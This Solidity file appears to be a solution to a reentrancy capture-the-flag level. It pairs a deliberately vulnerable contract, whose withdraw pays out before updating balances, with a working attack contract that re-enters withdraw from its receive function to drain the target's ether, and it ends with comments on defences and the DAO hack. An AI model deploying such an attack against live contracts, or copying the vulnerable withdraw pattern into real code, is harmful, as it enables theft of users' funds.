// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts/contracts/utils/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

// Hack :
interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 amount) external;
}

contract ReentranceAttack {
    IReentrance reentrance;

    constructor(address _targetAddress) {
        reentrance = IReentrance(_targetAddress);
    }

    function attack() external payable {
        reentrance.donate{value: msg.value}(address(this));

        reentrance.withdraw(msg.value);
    }

    receive() external payable {
        uint256 targetBalance = address(reentrance).balance;

        if (targetBalance >= 0.001 ether) {
            reentrance.withdraw(0.001 ether);
        }
    }
}

/* 
In order to prevent re-entrancy attacks when moving funds out of your contract, 
use the Checks-Effects-Interactions pattern being aware that call will only 
return false without interrupting the execution flow. Solutions such as ReentrancyGuard 
or PullPayment can also be used.

transfer and send are no longer recommended solutions as they can potentially
 break contracts after the Istanbul hard fork Source 1 Source 2.

Always assume that the receiver of the funds you are sending can be another 
contract, not just a regular address. Hence, it can execute code in its payable 
fallback method and re-enter your contract, possibly messing up your state/logic.

Re-entrancy is a common attack. You should always be prepared for it!

 

The DAO Hack
The famous DAO hack used reentrancy to extract a huge amount of ether from 
the victim contract. See 15 lines of code that could have prevented TheDAO Hack.
**/
